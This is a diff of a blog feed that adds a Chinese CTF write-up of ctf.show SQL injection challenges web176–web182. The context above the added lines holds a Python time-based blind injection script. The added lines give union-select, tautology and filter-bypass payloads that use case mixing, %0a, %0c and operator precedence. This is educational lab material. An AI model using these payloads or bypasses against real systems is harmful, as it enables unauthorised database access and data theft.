@@ -3514,6 +3514,32 @@ web82写的脚本改改直接用</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/16 16:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://9cb608df-e447-434e-b864-67001d4b869d.challenge.ctf.show:8080/api/v5.php&quot;</span></span><br><span class="line">dict = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(substr((select password from ctfshow_user5 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;,sleep(5),0)--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>运行后得到flag</p>
 <h3 id="web176"><a class="header-anchor" href="#web176">¶</a>web176</h3>
+<p>这次开始有过滤注入，先测出有三列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 3--+</span><br></pre></td></tr></table></figure>
+<p>fuzz测试一下，发现是对select进行了过滤，我们大小写绕过就好了，paylaod如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union Select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure>
+<p>还有另一种简单办法，既然存在注入，直接万能密码就好了<code>' or 1=1--+</code></p>
+<h3 id="web177"><a class="header-anchor" href="#web177">¶</a>web177</h3>
+<p>这次发现还多过滤了空格，我们可以用<code>%0a</code>换行符或者<code>/**/</code>注释符绕过(或者<code>%09,%0b,%0c,%0d</code>都可以)，这次我们用万能密码吧，用上面的也可以，不过绕过空格后有点长，后面的注释我们用<code>#</code>的url编码形式<code>%23</code>，payload为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1%23</span><br></pre></td></tr></table></figure>
+<h3 id="web178"><a class="header-anchor" href="#web178">¶</a>web178</h3>
+<p>这次<code>/**/</code>被ban了，我们换<code>%0a</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;%0aor%0a1&#x3D;1%23</span><br></pre></td></tr></table></figure>
+<h3 id="web179"><a class="header-anchor" href="#web179">¶</a>web179</h3>
+<p>这次测试一轮下来，发现只有<code>%0c</code>可以用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure>
+<h3 id="web180"><a class="header-anchor" href="#web180">¶</a>web180</h3>
+<p>这次把已知的能用的绕过空格方法都给过滤了，不过还可以采用运算符的方式来精心构造一个万能密码，先放出payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure>
+<p>前面我们已经知道表的结构是<code>id,username,password</code>，所以我们通过查id的方式去找flag，而用运算符中，<code>and</code>的优先级比<code>or</code>高，这句话放到查询语句中就变成了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;&#39;-1&#39;or(id&#x3D;26)and&#39;1&#39; limit 1;</span><br><span class="line">也就是</span><br><span class="line">(id&#x3D;&#39;-1&#39;) or ((id&#x3D;26) and &#39;1&#39;) limit 1;</span><br><span class="line">前面为0，后面为1，所以整个条件为1</span><br></pre></td></tr></table></figure>
+<h3 id="web181"><a class="header-anchor" href="#web181">¶</a>web181</h3>
+<p>这次倒是把waf语句给放出来了，可以看到正则匹配把大小写给过滤，还是一样用上面的payload可以过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure>
+<h3 id="web182"><a class="header-anchor" href="#web182">¶</a>web182</h3>
+<p>一样可以用上面的payload绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure>
+<h3 id="web183"><a class="header-anchor" href="#web183">¶</a>web183</h3>
 ]]></content>
       <tags>
         <tag>CTF</tag>
